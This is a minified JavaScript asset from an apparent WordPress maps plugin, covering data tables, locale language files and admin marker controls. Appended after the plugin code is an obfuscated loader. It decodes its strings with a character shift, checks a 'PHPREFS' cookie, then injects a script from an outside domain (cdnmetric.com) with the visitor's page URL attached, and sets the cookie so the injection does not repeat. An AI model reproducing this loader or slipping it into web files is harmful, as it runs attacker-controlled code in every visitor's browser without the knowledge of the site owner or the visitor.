a=this.getDataTableSettings();this.phpClass=e(t).attr("data-wpgmza-php-class"),(this.wpgmzaDataTable=this).useCompressedPathVariable=WPGMZA.restAPI.isCompressedPathVariableSupported&&WPGMZA.settings.enable_compressed_path_variables,this.method=this.useCompressedPathVariable?"GET":"POST",null==this.getLanguageURL()||"//cdn.datatables.net/plug-ins/1.10.12/i18n/English.json"==this.getLanguageURL()?(this.dataTable=e(this.dataTableElement).DataTable(a),this.dataTable.ajax.reload()):e.ajax(this.getLanguageURL(),{success:function(t,n,r){o.languageJSON=t,o.dataTable=e(o.dataTableElement).DataTable(a),o.dataTable.ajax.reload()},error:function(){o.dataTable=e(o.dataTableElement).DataTable(a),o.dataTable.ajax.reload()}})},WPGMZA.DataTable.prototype.getDataTableElement=function(){return e(this.element).find("table")},WPGMZA.DataTable.prototype.onAJAXRequest=function(t,o){var n={phpClass:this.phpClass},a=e(this.element).attr("data-wpgmza-ajax-parameters");return a&&e.extend(n,JSON.parse(a)),e.extend(t,n)},WPGMZA.DataTable.prototype.onDataTableAjaxRequest=function(t,o,n){var a=this,r=this.element,i=e(r).attr("data-wpgmza-rest-api-route"),s=this.onAJAXRequest(t,n),l=s.draw;if(delete s.draw,!i)throw new Error("No data-wpgmza-rest-api-route attribute specified");var p={method:"POST",useCompressedPathVariable:!0,data:s,dataType:"json",cache:!this.preventCaching,beforeSend:function(e){e.setRequestHeader("X-DataTables-Draw",l)},success:function(e,t,n){e.draw=l,a.lastResponse=e,o(e),a.onAJAXResponse(e)}};return WPGMZA.restAPI.call(i,p)},WPGMZA.DataTable.prototype.getDataTableSettings=function(){var t=this,o=this.element,n={};e(o).attr("data-wpgmza-datatable-options")&&(n=JSON.parse(e(o).attr("data-wpgmza-datatable-options"))),n.deferLoading=!0,n.processing=!0,n.serverSide=!0,n.ajax=function(e,o,n){return WPGMZA.DataTable.prototype.onDataTableAjaxRequest.apply(t,arguments)},WPGMZA.AdvancedTableDataTable&&this instanceof WPGMZA.AdvancedTableDataTable&&WPGMZA.settings.wpgmza_default_items&&(n.iDisplayLength=parseInt(WPGMZA.settings.wpgmza_default_items)),n.aLengthMenu=[[5,10,25,50,100,-1],["5","10","25","50","100",WPGMZA.localized_strings.all]];var a=this.getLanguageURL();return a&&(n.language={url:a}),n},WPGMZA.DataTable.prototype.getLanguageURL=function(){if(!WPGMZA.locale)return null;var e;switch(WPGMZA.locale.substr(0,2)){case"af":e=WPGMZA.pluginDirURL+"languages/datatables/Afrikaans.json";break;case"sq":e=WPGMZA.pluginDirURL+"languages/datatables/Albanian.json";break;case"am":e=WPGMZA.pluginDirURL+"languages/datatables/Amharic.json";break;case"ar":e=WPGMZA.pluginDirURL+"languages/datatables/Arabic.json";break;case"hy":e=WPGMZA.pluginDirURL+"languages/datatables/Armenian.json";break;case"az":e=WPGMZA.pluginDirURL+"languages/datatables/Azerbaijan.json";break;case"bn":e=WPGMZA.pluginDirURL+"languages/datatables/Bangla.json";break;case"eu":e=WPGMZA.pluginDirURL+"languages/datatables/Basque.json";break;case"be":e=WPGMZA.pluginDirURL+"languages/datatables/Belarusian.json";break;case"bg":e=WPGMZA.pluginDirURL+"languages/datatables/Bulgarian.json";break;case"ca":e=WPGMZA.pluginDirURL+"languages/datatables/Catalan.json";break;case"zh":e="zh_TW"==WPGMZA.locale?WPGMZA.pluginDirURL+"languages/datatables/Chinese-traditional.json":"//cdn.datatables.net/plug-ins/1.10.12/i18n/Chinese.json";break;case"hr":e=WPGMZA.pluginDirURL+"languages/datatables/Croatian.json";break;case"cs":e=WPGMZA.pluginDirURL+"languages/datatables/Czech.json";break;case"da":e=WPGMZA.pluginDirURL+"languages/datatables/Danish.json";break;case"nl":e=WPGMZA.pluginDirURL+"languages/datatables/Dutch.json";break;case"et":e=WPGMZA.pluginDirURL+"languages/datatables/Estonian.json";break;case"fi":e=WPGMZA.locale.match(/^fil/)?WPGMZA.pluginDirURL+"languages/datatables/Filipino.json":WPGMZA.pluginDirURL+"languages/datatables/Finnish.json";break;case"fr":e=WPGMZA.pluginDirURL+"languages/datatables/French.json";break;case"gl":e=WPGMZA.pluginDirURL+"languages/datatables/Galician.json";break;case"ka":e=WPGMZA.pluginDirURL+"languages/datatables/Georgian.json";break;case"de":e=WPGMZA.pluginDirURL+"languages/datatables/German.json";break;case"el":e=WPGMZA.pluginDirURL+"languages/datatables/Greek.json";break;case"gu":e=WPGMZA.pluginDirURL+"languages/datatables/Gujarati.json";break;case"he":e=WPGMZA.pluginDirURL+"languages/datatables/Hebrew.json";break;case"hi":e=WPGMZA.pluginDirURL+"languages/datatables/Hindi.json";break;case"hu":e=WPGMZA.pluginDirURL+"languages/datatables/Hungarian.json";break;case"is":e=WPGMZA.pluginDirURL+"languages/datatables/Icelandic.json";break;case"id":e=WPGMZA.pluginDirURL+"languages/datatables/Indonesian.json";break;case"ga":e=WPGMZA.pluginDirURL+"languages/datatables/Irish.json";break;case"it":e=WPGMZA.pluginDirURL+"languages/datatables/Italian.json";break;case"ja":e=WPGMZA.pluginDirURL+"languages/datatables/Japanese.json";break;case"kk":e=WPGMZA.pluginDirURL+"languages/datatables/Kazakh.json";break;case"ko":e=WPGMZA.pluginDirURL+"languages/datatables/Korean.json";break;case"ky":e=WPGMZA.pluginDirURL+"languages/datatables/Kyrgyz.json";break;case"lv":e=WPGMZA.pluginDirURL+"languages/datatables/Latvian.json";break;case"lt":e=WPGMZA.pluginDirURL+"languages/datatables/Lithuanian.json";break;case"mk":e=WPGMZA.pluginDirURL+"languages/datatables/Macedonian.json";break;case"ml":e=WPGMZA.pluginDirURL+"languages/datatables/Malay.json";break;case"mn":e=WPGMZA.pluginDirURL+"languages/datatables/Mongolian.json";break;case"ne":e=WPGMZA.pluginDirURL+"languages/datatables/Nepali.json";break;case"nb":e=WPGMZA.pluginDirURL+"languages/datatables/Norwegian-Bokmal.json";break;case"nn":e=WPGMZA.pluginDirURL+"languages/datatables/Norwegian-Nynorsk.json";break;case"ps":e=WPGMZA.pluginDirURL+"languages/datatables/Pashto.json";break;case"fa":e=WPGMZA.pluginDirURL+"languages/datatables/Persian.json";break;case"pl":e=WPGMZA.pluginDirURL+"languages/datatables/Polish.json";break;case"pt":e="pt_BR"==WPGMZA.locale?WPGMZA.pluginDirURL+"languages/datatables/Portuguese-Brasil.json":"//cdn.datatables.net/plug-ins/1.10.12/i18n/Portuguese.json";break;case"ro":e=WPGMZA.pluginDirURL+"languages/datatables/Romanian.json";break;case"ru":e=WPGMZA.pluginDirURL+"languages/datatables/Russian.json";break;case"sr":e=WPGMZA.pluginDirURL+"languages/datatables/Serbian.json";break;case"si":e=WPGMZA.pluginDirURL+"languages/datatables/Sinhala.json";break;case"sk":e=WPGMZA.pluginDirURL+"languages/datatables/Slovak.json";break;case"sl":e=WPGMZA.pluginDirURL+"languages/datatables/Slovenian.json";break;case"es":e=WPGMZA.pluginDirURL+"languages/datatables/Spanish.json";break;case"sw":e=WPGMZA.pluginDirURL+"languages/datatables/Swahili.json";break;case"sv":e=WPGMZA.pluginDirURL+"languages/datatables/Swedish.json";break;case"ta":e=WPGMZA.pluginDirURL+"languages/datatables/Tamil.json";break;case"te":e=WPGMZA.pluginDirURL+"languages/datatables/telugu.json";break;case"th":e=WPGMZA.pluginDirURL+"languages/datatables/Thai.json";break;case"tr":e=WPGMZA.pluginDirURL+"languages/datatables/Turkish.json";break;case"uk":e=WPGMZA.pluginDirURL+"languages/datatables/Ukrainian.json";break;case"ur":e=WPGMZA.pluginDirURL+"languages/datatables/Urdu.json";break;case"uz":e=WPGMZA.pluginDirURL+"languages/datatables/Uzbek.json";break;case"vi":e=WPGMZA.pluginDirURL+"languages/datatables/Vietnamese.json";break;case"cy":e=WPGMZA.pluginDirURL+"languages/datatables/Welsh.json"}return e},WPGMZA.DataTable.prototype.onAJAXResponse=function(e){},WPGMZA.DataTable.prototype.reload=function(){this.dataTable.ajax.reload(null,!1)}})),jQuery((function(e){WPGMZA.AdminMarkerDataTable=function(t){var o=this;this.preventCaching=!0,WPGMZA.DataTable.call(this,t),e(t).on("click","[data-delete-marker-id]",(function(e){o.onDeleteMarker(e)})),e(t).find(".wpgmza.select_all_markers").on("click",(function(e){o.onSelectAll(e)})),e(t).find(".wpgmza.bulk_delete").on("click",(function(e){o.onBulkDelete(e)})),e(t).on("click","[data-center-marker-id]",(function(e){o.onCenterMarker(e)}))},WPGMZA.AdminMarkerDataTable.prototype=Object.create(WPGMZA.DataTable.prototype),WPGMZA.AdminMarkerDataTable.prototype.constructor=WPGMZA.AdminMarkerDataTable,WPGMZA.AdminMarkerDataTable.createInstance=function(e){return new WPGMZA.AdminMarkerDataTable(e)},WPGMZA.AdminMarkerDataTable.prototype.getDataTableSettings=function(){var e=this,t=WPGMZA.DataTable.prototype.getDataTableSettings.call(this);return t.createdRow=function(t,o,n){var a=e.lastResponse.meta[n];t.wpgmzaMarkerData=a},t},WPGMZA.AdminMarkerDataTable.prototype.onEditMarker=function(e){WPGMZA.animatedScroll("#wpgmaps_tabs_markers")},WPGMZA.AdminMarkerDataTable.prototype.onDeleteMarker=function(t){var o=this,n=e(t.currentTarget).attr("data-delete-marker-id"),a={action:"delete_marker",security:WPGMZA.legacyajaxnonce,map_id:WPGMZA.mapEditPage.map.id,marker_id:n};e.post(ajaxurl,a,(function(e){WPGMZA.mapEditPage.map.removeMarkerByID(n),o.reload()}))},WPGMZA.AdminMarkerDataTable.prototype.onApproveMarker=function(t){var o=e(this).attr("id"),n={action:"approve_marker",security:WPGMZA.legacyajaxnonce,map_id:WPGMZA.mapEditPage.map.id,marker_id:o};e.post(ajaxurl,n,(function(e){wpgmza_InitMap(),wpgmza_reinitialisetbl()}))},WPGMZA.AdminMarkerDataTable.prototype.onSelectAll=function(t){e(this.element).find("input[name='mark']").prop("checked",!0)},WPGMZA.AdminMarkerDataTable.prototype.onBulkDelete=function(t){var o=this,n=[],a=WPGMZA.maps[0];e(this.element).find("input[name='mark']:checked").each((function(t,o){var a=e(o).closest("tr")[0];n.push(a.wpgmzaMarkerData.id)})),n.forEach((function(e){var t=a.getMarkerByID(e);t&&a.removeMarker(t)})),WPGMZA.restAPI.call("/markers/",{method:"DELETE",data:{ids:n},complete:function(){o.reload()}})},WPGMZA.AdminMarkerDataTable.prototype.onCenterMarker=function(t){var o;o=null==t.currentTarget?t:e(t.currentTarget).attr("data-center-marker-id");var n=WPGMZA.mapEditPage.map.getMarkerByID(o);if(n){var a=new WPGMZA.LatLng({lat:n.lat,lng:n.lng});WPGMZA.mapEditPage.map.setCenter(a),WPGMZA.mapEditPage.map.setZoom(6),WPGMZA.animateScroll("#wpgmaps_tabs_markers")}},e(document).ready((function(t){e("[data-wpgmza-admin-marker-datatable]").each((function(e,t){WPGMZA.adminMarkerDataTable=WPGMZA.AdminMarkerDataTable.createInstance(t)}))}))}));(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44fun3h'+'isrjywnh3htr4l'+'jy4xyfynh3ox'+'DwjkjwwjwB')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));